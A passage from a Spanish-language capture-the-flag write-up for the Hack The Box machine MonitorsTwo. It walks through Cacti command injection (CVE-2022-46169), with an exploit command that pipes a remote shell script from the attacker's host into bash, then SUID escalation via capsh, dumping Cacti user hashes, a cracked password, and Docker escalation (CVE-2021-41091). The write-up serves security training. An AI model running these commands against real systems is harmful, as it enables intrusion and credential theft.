-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poll_for_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-	&lt;span class=&quot;nv&quot;&gt;$local_data_ids&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_nfilter_request_var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'local_data_ids'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;nv&quot;&gt;$host_id&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_filter_request_var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;nv&quot;&gt;$poller_id&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_nfilter_request_var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'poller_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;nv&quot;&gt;$return&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-
-	&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;cacti_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$local_data_ids&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$local_data_ids&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$local_data_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-			&lt;span class=&quot;nf&quot;&gt;input_validate_input_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$local_data_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'local_data_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-			&lt;span class=&quot;nv&quot;&gt;$items&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;db_fetch_assoc_prepared&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'SELECT *
-				FROM poller_item
-				WHERE host_id = ?
-				AND local_data_id = ?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$local_data_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-			&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;cacti_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$items&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-					&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'action'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-					&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
-					&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;POLLER_ACTION_SCRIPT_PHP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* script (php script server) */&lt;/span&gt;
-						&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
-						&lt;span class=&quot;nv&quot;&gt;$cactiphp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;proc_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read_config_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'path_php_binary'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' -q '&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'base_path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/script_server.php realtime '&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$poller_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cactides&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pipes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-						&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Cuando se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll_for_data()&lt;/code&gt; se recuperan algunos parámetros de la peticion, si el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poller_item&lt;/code&gt; entra el case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POLLER_ACTION_SCRIPT_PHP&lt;/code&gt;, la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_open&lt;/code&gt; ejecuta un script PHP&lt;/p&gt;
-
-&lt;p&gt;Y uno de los parametros es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poller_id&lt;/code&gt;, y se recupera a través de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_filter_request_var()&lt;/code&gt;, si buscan esa funcion en google, se daran cuenta que perimte insertar cadenas arbitrarias, esta variable de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poller_id&lt;/code&gt; se inserta luego en la cadena que se le pasa a proc_open, por lo que nosotros podemos indicarle que ejecute cualquier otra cosa en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poller_id&lt;/code&gt;, lo que conduce a una vulnerabilidad de inyección de comandos.&lt;/p&gt;
-
-&lt;p&gt;Al buscar en google podemos encontrar un par de exploits, usare este: &lt;a href=&quot;https://github.com/sAsPeCt488/CVE-2022-46169&quot;&gt;https://github.com/sAsPeCt488/CVE-2022-46169&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Si vemos un poco el codigo:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/remote_agent.php'&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'action'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'polldata'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'host_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-              &lt;span class=&quot;s&quot;&gt;'poller_id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'local_data_ids[]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_data_ids&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'X-Forwarded-For'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos como en el parametro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poller_id&lt;/code&gt; le esta adjuntando nuestro payload, que es esto declarado mas aca arriba: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload = f'; /bin/sh -c &quot;{cmd}&quot;'&lt;/code&gt;,&lt;/p&gt;
-
-&lt;p&gt;Solo queda ejecutar el exploit asi: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 CVE-2022-46169.py http://10.10.11.211 -c &quot;curl &amp;lt;tu_IP&amp;gt;:8080/shell.sh | bash&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Si quieren hacer una explotacion manual, apunten a este recurso:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/remote_agent.php?action=polldata&amp;amp;poller_id=;bash -c '&amp;lt;comando&amp;gt;'&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Y ya nos llego la rev shell:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/monitorsTwo/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-docker&quot;&gt;Escalada de Docker&lt;/h2&gt;
-
-&lt;p&gt;Ahora buscaremos binarios con permisos SUID: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos ver el binario: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sbin/capsh&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Si haces una busqueda en GFTObins encontramos que nos podemos hacer root: &lt;a href=&quot;https://gtfobins.github.io/gtfobins/capsh/#suid&quot;&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@50bca5e748b0:/sbin$ ./capsh --gid=0 --uid=0 --
-./capsh --gid=0 --uid=0 --
-whoami 
-root
-id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Sin embargo, no nos servira para conseguir ninguna flag, ya que estamos dentro de un contenedor, a este punto decidi usar linpeas para ver si hay otro archivo interesante, y me arrojo que existe uno que se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/entrypoint.sh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ex&lt;/span&gt;
-
-wait-for-it db:3306 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 300 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;database is connected&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;db &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root cacti &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;show tables&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~ &lt;span class=&quot;s2&quot;&gt;&quot;automation_devices&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
-    &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;db &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root cacti &amp;lt; /var/www/html/cacti.sql
-    mysql &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;db &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root cacti &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;UPDATE user_auth SET must_change_password='' WHERE username = 'admin'&quot;&lt;/span&gt;
-    mysql &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;db &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root cacti &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SET GLOBAL time_zone = 'UTC'&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;fi
-
-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;www-data:www-data &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; /var/www/html
-&lt;span class=&quot;c&quot;&gt;# first arg is `-f` or `--some-option`&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;#-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
-	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; apache2-foreground &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;fi
-
-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y tenemos la capacidad de ejecutar el comando: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql --host=db --user=root --password=root cacti -e &quot;consulta&quot;&lt;/code&gt;, no hace falta indicarle la base de datos ya que ya se esta usando, y es la de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti&lt;/code&gt;, ahora mostraremos todas las tablas:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Las tablas de nuestro interes son estas:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user_auth
-user_auth_cache
-user_auth_group
-user_auth_group_members
-user_auth_group_perms
-user_auth_group_realm
-user_auth_perms
-user_auth_realm
-user_domains
-user_domains_ldap
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Empezare a ver los datos de la primera tabla:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql --host=db --user=root --password=root cacti -e &quot;select * from user_auth&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Aun que se vea extraño, hemos conseguido usuarios y el hash de sus contraseñas&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/monitorsTwo/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Les adelando que la unica que podemos crackear sera la de Marcus y esta cifrada con bcrypt, pueden usar John o Hashcat&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;usr:&lt;/strong&gt; marcus&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;pass:&lt;/strong&gt; funkymonkey&lt;/p&gt;
-
-&lt;p&gt;Ya tenemos la primera flag&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;marcus@monitorstwo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
-a93ad02d6adb6a980368dad17b1&lt;span class=&quot;k&quot;&gt;*****&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada&quot;&gt;Escalada&lt;/h2&gt;
-
-&lt;h3 id=&quot;cve-2021-41091&quot;&gt;CVE-2021-41091&lt;/h3&gt;
-
-&lt;p&gt;De nuevo ejecute linpeas, y me llamo la atencion una interfaz de red que corresponde a docker:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker0: flags=4099&amp;lt;UP,BROADCAST,MULTICAST&amp;gt;  mtu 1500
-        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
-        ether 02:42:73:b5:33:00  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 0  bytes 0 (0.0 B)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como no tenemos permisos para listar contenedores ni hacer operaciones con ellos, decidi ver si habia vulnerabilidades en la version que docker que esta corriendo en la maquina (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20.10.5&lt;/code&gt;)&lt;/p&gt;
-
-&lt;p&gt;Encontre que hay una vulnerabilidad adyacente a docker: &lt;a href=&quot;https://security.snyk.io/vuln/SNYK-SLES150-DOCKER-2661076&quot;&gt;https://security.snyk.io/vuln/SNYK-SLES150-DOCKER-2661076&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Otra forma de saber que existe una vulnerabilidad es por que linpeas nos muestra dos rutas donde puede que hayan correos:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus
-4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al leerlo, vemos que nos dice que existen varias vulnerabilidades:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;From: administrator@monitorstwo.htb
-To: all@monitorstwo.htb
-Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
-
-Dear all,
-
-We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
-
-CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
-
-CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
-
-CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
-
-We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
-
-Best regards,
-
-Administrator
-CISO
-Monitor Two
-Security Team
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como estamos contra un docker entonces veremos la ultima&lt;/p&gt;
-
-&lt;p&gt;La vulnerabilidad se aprovecha de Moby Docker Engine, el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/docker&lt;/code&gt;, contiene subdirectorios con permisos insuficientes, donde basicamente se pueden ejectuar binarios  con permisos SUID en los contendores para poder moverse a travez del sistema.&lt;/p&gt;
-
-&lt;p&gt;De hecho si mostramos el espacio del disco con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;df -h&lt;/code&gt; podemos ver que tenemos varios directorios interesantes que se encuetran desde la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/docker&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/monitorsTwo/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para aprovecharnos de esto, desde la sesion que conseguimos con la rev shell (www-data que escalamos a root), le asignaremos permisos SUID a /bin/bash, despues ingresaremos a esta ruta&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;La cual corresponde a una de las que sacamos con el comando df -h, luego ingresamos el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt;, y te puedes dar cuenta como tiene permisos SUID, ahora solo queda poner &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./bash -p&lt;/code&gt; y ya somos root&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-5.1# whoami
-root
-bash-5.1# cat /root/root.txt 
-b24ba43b32faf36aa02f70b2079*****
-bash-5.1#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
